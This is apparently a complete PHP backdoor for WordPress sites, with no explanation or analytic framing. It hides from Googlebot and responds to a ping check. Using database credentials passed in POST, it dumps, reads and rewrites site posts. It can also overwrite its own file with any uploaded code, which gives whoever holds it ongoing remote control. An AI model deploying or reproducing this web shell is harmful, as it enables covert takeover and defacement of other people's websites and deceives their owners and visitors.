<?php
error_reporting(0);
set_time_limit(0);
@ini_set('memory_limit', '512M');
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']) , 'googlebot')) {
    header("HTTP/1.1 301 Moved Permanently");
    exit;
}
if (isset($_GET['ping'])) {
    echo json_encode(array(
        'v' => '5.3',
    ));
    die();
}
if (isset($_POST['h'], $_POST['u'], $_POST['p'], $_POST['n'])) {
    $h = $_POST['h'];
    $u = $_POST['u'];
    $p = $_POST['p'];
    $n = $_POST['n'];
    $f = (!isset($_POST['f'])) ? empty($_POST['f']) ? 'wp_' : $_POST['f'] : $_POST['f'];
    $db = mysqli_connect($h, $u, $p, $n);
    $db or die(json_encode(array(
        'status' => 'db_error',
        'msg' => mysqli_error($db)
    )));
    mysqli_set_charset($db, "utf8");
    $posts = $f . 'posts';
    header('Content-Type: application/json');
    if (isset($_GET['show'])) {
        $show = mysqli_query($db, "SELECT * FROM `$posts` WHERE `post_content` IS NOT NULL AND `post_status` NOT IN ('draft', 'auto-draft', 'future', 'pending', 'private', 'trash', 'inherit');");
        $total = mysqli_num_rows($show);
        if ($total > 0) {
            $articles = array();
            $show_content = isset($_GET['show_content']) ? true : false;
            while ($row = mysqli_fetch_assoc($show)) {
                $post_id = $row['ID'];
                $post_date = $row['post_date'];
                $post_modified = $row['post_modified'];
                $post_type = $row['post_type'];
                $guid = $row['guid'];
                $post_title = $row['post_title'];
                $comment_count = $row['comment_count'];
                $post_content = $row['post_content'];
                if (strlen($row['post_content']) > 1) {
                    if ($show_content) {
                        $postArray = array(
                            'post_id' => $post_id,
                            'post_date' => $post_date,
                            'post_modified' => $post_modified,
                            'post_type' => $post_type,
                            'guid' => $guid,
                            'post_title' => $post_title,
                            'post_content' => $post_content,
                            'comment_count' => $comment_count
                        );
                    }
                    else {
                        $postArray = array(
                            'post_id' => $post_id,
                            'post_date' => $post_date,
                            'post_modified' => $post_modified,
                            'post_type' => $post_type,
                            'guid' => $guid,
                            'post_title' => $post_title,
                            'post_content' => $post_content,
                            'comment_count' => $comment_count
                        );
                    }
                    $articles[] = $postArray;
                }
            }
            $data = array(
                'status' => 'success',
                'num_rows' => $total,
                'data' => $articles
            );
            die(json_encode($data));
        }
    }
    elseif (isset($_GET['arid'])) {
        $id = mysqli_escape_string($db, $_GET['arid']);
        $pick = mysqli_query($db, "SELECT * FROM `$posts` WHERE `ID` = '$id';");
        $total = mysqli_num_rows($pick);
        if ($total > 0) {
            $articles = array();
            $row = mysqli_fetch_assoc($pick);
            $post_type = $row['post_type'];
            $guid = $row['guid'];
            $post_title = $row['post_title'];
            $post_content = $row['post_content'];
            $data = array(
                'status' => 'success',
                'num_rows' => $total,
                'post_type' => $post_type,
                'guid' => $guid,
                'post_title' => $post_title,
                'post_content' => $post_content
            );
            die(json_encode($data));
        }
    }
    elseif (isset($_GET['edit'])) {
        if (isset($_POST['post_id'], $_POST['post_title'], $_POST['post_content'])) {
            $post_id = mysqli_real_escape_string($db, $_POST['post_id']);
            $post_title = str_replace("'", "\'", stripslashes($_POST['post_title']));
            $post_content = str_replace("'", "\'", stripslashes($_POST['post_content']));
            mysqli_query($db, "UPDATE $posts SET `post_content`='$post_content', `post_title`='$post_title' WHERE `ID`=$post_id;");
            if (mysqli_affected_rows($db) > 0) {
                die(json_encode(array(
                    'status' => 'update_success'
                )));
            }
            else {
                die(json_encode(array(
                    'status' => 'update_failed'
                )));
            }
        }
        else {
            die(json_encode(array(
                'status' => 'incomplete_data'
            )));
        }
    } elseif (isset($_GET['update'])) {
        if (isset($_FILES['file'])) {
            $new = file_get_contents($_FILES['file']['tmp_name']);
            $hash = isset($_POST['hash']) ? $_POST['hash'] : null;
            if (!$hash || $_POST['hash'] == md5($new)) {
                file_put_contents(dirname(__FILE__) . '/' . basename(__FILE__), $new);
            }
        }
    }
    @mysqli_close($db);
} /** - 77617 - */